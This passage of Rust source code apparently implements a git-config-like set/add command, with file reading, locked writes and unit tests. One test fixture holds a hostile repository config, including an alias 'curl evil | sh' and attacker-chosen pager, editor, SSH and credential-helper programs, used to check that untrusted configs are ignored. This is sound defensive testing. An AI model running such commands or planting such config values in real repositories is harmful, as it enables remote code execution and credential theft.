                return Err(usage_error("wrong number of arguments, should be from 2 to 3"));
            };
            let key = parse_key(name).map_err(CliError::Msg)?;
            let stored = match o.ty {
                Some(_) => convert(o.ty, &key, Some(value), home.as_deref())?,
                None => value.clone(),
            };
            let accept = value_filter(
                o.value_pattern
                    .as_deref()
                    .or(o.positional.get(2).map(String::as_str)),
            )?;
            let found = matching_indices(&file, &key, &accept);
            match action {
                Action::Add => push_value(&mut file, &key, &stored)?,
                Action::Set if found.len() > 1 => {
                    eprintln!(
                        "warning: {} has multiple values\nerror: cannot overwrite multiple values with a single value\n       Use a regexp, --add or --replace-all to change {}.",
                        key.display(),
                        key.display()
                    );
                    return Ok(ExitCode::from(5));
                }
                _ if found.is_empty() => push_value(&mut file, &key, &stored)?,
                _ => {
                    let mut values = file
                        .raw_values_mut_by(key.section.as_str(), key.sub_bstr(), key.name.as_str())
                        .map_err(|e| CliError::Fatal(e.to_string()))?;
                    for i in found.iter().skip(1).rev() {
                        values.delete(*i);
                    }
                    values
                        .set_at(found[0], stored.as_str())
                        .map_err(|e| CliError::Fatal(e.to_string()))?;
                }
            }
        }
        Action::Get | Action::GetAll | Action::GetRegexp | Action::List => unreachable!(),
    }
    write_file(&path, &file)?;
    Ok(ExitCode::SUCCESS)
}

/// Indices (within the file's value list for `key`) of the values `accept` selects.
fn matching_indices(file: &File, key: &Key, accept: &dyn Fn(&str) -> bool) -> Vec<usize> {
    let values = file
        .raw_values_by(key.section.as_str(), key.sub_bstr(), key.name.as_str())
        .unwrap_or_default();
    values
        .iter()
        .enumerate()
        .filter(|(_, v)| accept(&v.to_string()))
        .map(|(i, _)| i)
        .collect()
}

fn push_value(file: &mut File, key: &Key, value: &str) -> Result<()> {
    let mut section = file
        .section_mut_or_create_new(key.section.as_str(), key.sub_bstr())
        .map_err(|e| CliError::Fatal(e.to_string()))?;
    section
        .push(key.name.as_str(), value)
        .map_err(|e| CliError::Fatal(e.to_string()))?;
    Ok(())
}

/// A single file without following includes: what is written back must not inline them.
fn read_file_no_includes(path: &Path, source: Source) -> Result<File> {
    if !path.is_file() {
        return Ok(File::new(meta(source, path, Trust::Full)));
    }
    let bytes = std::fs::read(path).map_err(|_| {
        CliError::Msg(Msg::ConfigUnreadable {
            path: path.display().to_string(),
            reason: "Permission denied".into(),
        })
    })?;
    File::from_bytes_no_includes(&bytes, meta(source, path, Trust::Full), init::Options::default())
        .map_err(|e| CliError::Fatal(format!("bad config file '{}': {e}", path.display())))
}

#[cfg(test)]
mod tests {
    use super::*;

    fn file_of(text: &str) -> File {
        File::try_from(text).expect("test config parses")
    }

    #[test]
    fn keys_are_validated_like_git() {
        let key = parse_key("Remote.Origin.URL").unwrap();
        assert_eq!(key.display(), "remote.Origin.url");
        assert_eq!(parse_key("a.b").unwrap().sub, None);
        assert_eq!(parse_key("a.b.c.d").unwrap().sub.as_deref(), Some("b.c"));
        assert!(matches!(parse_key("nokey"), Err(Msg::ConfigNoSection { .. })));
        assert!(matches!(parse_key("a."), Err(Msg::ConfigNoVariable { .. })));
        for bad in ["a.1b", "a.b c", ".b", "a b.c", "a.b_c"] {
            assert!(matches!(parse_key(bad), Err(Msg::ConfigInvalidKey { .. })), "{bad}");
        }
    }

    #[test]
    fn values_convert_like_git_config_types() {
        let key = parse_key("a.b").unwrap();
        let conv = |ty, v: Option<&str>| convert(Some(ty), &key, v, None).unwrap();
        assert_eq!(conv(ValueType::Bool, Some("Yes")), "true");
        assert_eq!(conv(ValueType::Bool, None), "true", "a key without = is true");
        assert_eq!(conv(ValueType::Bool, Some("0")), "false");
        assert_eq!(conv(ValueType::Int, Some("1k")), "1024");
        assert_eq!(conv(ValueType::Int, Some("2M")), "2097152");
        assert_eq!(conv(ValueType::BoolOrInt, Some("true")), "true");
        assert_eq!(conv(ValueType::BoolOrInt, Some("7")), "7");
        assert!(convert(Some(ValueType::Int), &key, Some("x"), None).is_err());
        assert!(convert(Some(ValueType::Bool), &key, Some("maybe"), None).is_err());
        let home = Path::new("/home/u");
        assert_eq!(
            convert(Some(ValueType::Path), &key, Some("~/x"), Some(home)).unwrap(),
            "/home/u/x"
        );
    }

    #[test]
    fn entries_keep_file_order_with_repeated_keys() {
        let file = file_of("[A]\n\tx = 1\n\ty = 2\n\tx = 3\n[a \"Sub\"]\n\tz = 4\n");
        let got: Vec<_> = entries(&file)
            .into_iter()
            .map(|e| (e.key.display(), e.value.unwrap_or_default()))
            .collect();
        assert_eq!(
            got,
            [
                ("a.x".to_owned(), "1".to_owned()),
                ("a.y".to_owned(), "2".to_owned()),
                ("a.x".to_owned(), "3".to_owned()),
                ("a.Sub.z".to_owned(), "4".to_owned()),
            ]
        );
    }

    #[test]
    fn command_line_params_render_as_a_config_layer() {
        let params = [
            ConfigParam::parse("core.editor=vi \"quoted\""),
            ConfigParam::parse("remote.o.url=x"),
            ConfigParam::parse("bad key=1"),
        ];
        let layer = render_params(params.iter());
        let file = File::try_from(layer.as_str()).unwrap();
        assert_eq!(file.string("core.editor").unwrap(), "vi \"quoted\"");
        assert_eq!(file.string("remote.o.url").unwrap(), "x");
        assert!(file.string("bad key").is_none(), "an invalid key is skipped");
    }

    #[test]
    fn rewrites_use_lf_unless_the_file_was_crlf() {
        let t = tempfile::tempdir().unwrap();
        let lf = t.path().join("lf");
        write_file(&lf, &file_of("[a]\r\n\tb = c\r\n")).unwrap();
        assert_eq!(std::fs::read(&lf).unwrap(), b"[a]\n\tb = c\n");
        let crlf = t.path().join("crlf");
        std::fs::write(&crlf, b"[a]\r\n\tb = c\r\n").unwrap();
        write_file(&crlf, &file_of("[a]\r\n\tb = d\r\n")).unwrap();
        assert_eq!(std::fs::read(&crlf).unwrap(), b"[a]\r\n\tb = d\r\n");
        assert!(!t.path().join("lf.lock").exists(), "the lock is renamed away");
    }

    #[test]
    fn a_held_lock_fails_the_write() {
        let t = tempfile::tempdir().unwrap();
        let path = t.path().join("config");
        std::fs::write(t.path().join("config.lock"), b"").unwrap();
        let err = write_file(&path, &file_of("[a]\n\tb = c\n")).unwrap_err();
        assert!(err.to_string().starts_with("could not lock config file"), "{err}");
        assert!(!path.exists());
    }

    #[cfg(unix)]
    #[test]
    fn rewrites_keep_the_file_mode_and_new_files_are_not_widened() {
        use std::os::unix::fs::PermissionsExt;
        let mode_of = |p: &Path| std::fs::metadata(p).unwrap().permissions().mode() & 0o7777;
        let t = tempfile::tempdir().unwrap();
        // A `chmod 600` config holding credentials stays 600 across a rewrite.
        let secret = t.path().join("secret");
        std::fs::write(&secret, b"[credential]\n\thelper = store\n").unwrap();
        std::fs::set_permissions(&secret, std::fs::Permissions::from_mode(0o600)).unwrap();
        write_file(&secret, &file_of("[credential]\n\thelper = cache\n")).unwrap();
        assert_eq!(mode_of(&secret), 0o600);
        // A wider mode is kept as it was.
        let shared = t.path().join("shared");
        std::fs::write(&shared, b"[a]\n").unwrap();
        std::fs::set_permissions(&shared, std::fs::Permissions::from_mode(0o664)).unwrap();
        write_file(&shared, &file_of("[a]\n\tb = c\n")).unwrap();
        assert_eq!(mode_of(&shared), 0o664);
        // A new file is created with at most 0o666 & !umask.
        let fresh = t.path().join("fresh");
        write_file(&fresh, &file_of("[a]\n\tb = c\n")).unwrap();
        assert_eq!(mode_of(&fresh) & !0o666, 0);
    }

    /// A repo-local `config` text loaded as `asc` loads it, with ownership decided by `owned`.
    fn load_local(text: &str, owned: bool) -> ConfigSnapshot {
        let t = tempfile::tempdir().unwrap();
        std::fs::write(t.path().join("config"), text).unwrap();
        let local = LocalConfig {
            common_dir: t.path(),
            toplevel: t.path(),
        };
        let none = |_: &str| Some(OsString::from("1")).filter(|_| false);
        let probe = move |_: &Path| Ok(owned);
        let global = t.path().join("no-global");
        let get = move |k: &str| match k {
            "GIT_CONFIG_NOSYSTEM" => Some(OsString::from("1")),
            "GIT_CONFIG_GLOBAL" => Some(global.clone().into_os_string()),
            _ => none(k),
        };
        let env = GitEnv::from_vars(&|_| None);
        ConfigSnapshot::load_with(&env, &get, Some(&local), &probe).unwrap()
    }

    const HOSTILE: &str = "[asc]\n\trealGit = /tmp/evil-git\n\thome = /tmp/evil-home\n\
        [asc \"cache\"]\n\tdir = /tmp/evil-cache\n\treadOnly = /tmp/evil-ro\n\
        [alias]\n\tpwn = !curl evil | sh\n\tst = status -s\n\
        [core]\n\tpager = evil-pager\n\teditor = evil-editor\n\tfsmonitor = evil-fsm\n\
        \tsshCommand = evil-ssh\n\tabbrev = 12\n\
        [pager]\n\tlog = evil-log-pager\n\
        [credential]\n\thelper = !evil-helper\n\
        [credential \"https://example.com\"]\n\thelper = evil\n\
        [user]\n\tname = Mallory\n";

    #[test]
    fn a_config_the_user_does_not_own_cannot_name_programs_or_redirect_state() {
        let c = load_local(HOSTILE, false);
        for key in [
            "asc.realGit",
            "asc.home",
            "asc.cache.dir",
            "asc.cache.readOnly",
            "alias.pwn",
            "core.pager",
            "core.editor",
            "core.fsmonitor",
            "core.sshCommand",
            "pager.log",
            "credential.helper",
            "credential.https://example.com.helper",
        ] {
            assert_eq!(c.get(key), None, "{key} must be ignored from a reduced-trust file");
        }
        assert!(c.path("asc.realGit").is_none());
        assert!(c.get_all("asc.cache.readOnly").is_empty());
        // Harmless keys still apply.
        assert_eq!(c.get("alias.st").as_deref(), Some("status -s"));
        assert_eq!(c.get("core.abbrev").as_deref(), Some("12"));
        assert_eq!(c.get("user.name").as_deref(), Some("Mallory"));
    }

    #[test]
    fn a_config_the_user_owns_keeps_every_key() {
        let c = load_local(HOSTILE, true);
        assert_eq!(c.get("asc.realGit").as_deref(), Some("/tmp/evil-git"));
        assert_eq!(c.get("alias.pwn").as_deref(), Some("!curl evil | sh"));
        assert_eq!(c.get("core.pager").as_deref(), Some("evil-pager"));
    }

    #[test]
    fn reduced_trust_drops_every_value_of_a_repeated_key() {
        let c = load_local("[core]\n\teditor = a\n\teditor = b\n[core]\n\teditor = c\n", false);
        assert_eq!(c.get("core.editor"), None);
        assert!(c.get_all("core.editor").is_empty());
    }

    #[test]
    fn a_global_file_keeps_full_trust() {
        let t = tempfile::tempdir().unwrap();
        let global = t.path().join("gitconfig");
        std::fs::write(&global, b"[core]\n\teditor = vim\n[alias]\n\tsh = !echo\n").unwrap();
        let g = global.clone();
        let get = move |k: &str| match k {
            "GIT_CONFIG_NOSYSTEM" => Some(OsString::from("1")),
            "GIT_CONFIG_GLOBAL" => Some(g.clone().into_os_string()),
            _ => None,
        };
        let env = GitEnv::from_vars(&|_| None);
        let c = ConfigSnapshot::load_with(&env, &get, None, &|_: &Path| Ok(false)).unwrap();
        assert_eq!(c.get("core.editor").as_deref(), Some("vim"));
        assert_eq!(c.get("alias.sh").as_deref(), Some("!echo"));
    }
}
